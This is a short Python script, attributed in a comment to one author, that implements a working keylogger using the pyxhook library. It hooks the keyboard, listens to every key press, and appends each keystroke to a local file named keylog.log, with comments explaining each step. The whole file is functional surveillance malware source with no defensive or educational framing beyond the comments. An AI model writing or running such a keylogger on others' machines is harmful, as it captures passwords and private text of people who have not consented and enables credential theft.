#Nick Perri 
# import os and pyxhook 
# run pip install pyxhook 
import os
import pyxhook 



# main 
def main():
    # specifies the name/location of the file where the output will be saved
    log_file = f'{os.getcwd()}/{"keylog"}.log' 

    # the logging function that is based on key presses 
    def KeyP(e):
        # open the file with append 
        with open(log_file, "a") as f: 
            # If enter key is pressed 
            if e.Ascii == 13:
                # Write to the file the enter key was pressed and then go to a new line
                f.write('Enter\n')
            # If spacepar is pressed 
            if e.Ascii == 32:
                f.write(' [spacebar] ')
            else:
                # write to the file every character and convert input to readable ascii
                f.write(e.Key)

    # create HookManager 
    new_hook = pyxhook.HookManager()
    #listen to all key presses 
    new_hook.KeyDown = KeyP

    # hook the keyboard 
    new_hook.HookKeyboard()

    #start session
    new_hook.start()

if __name__ == "__main__":
    main()
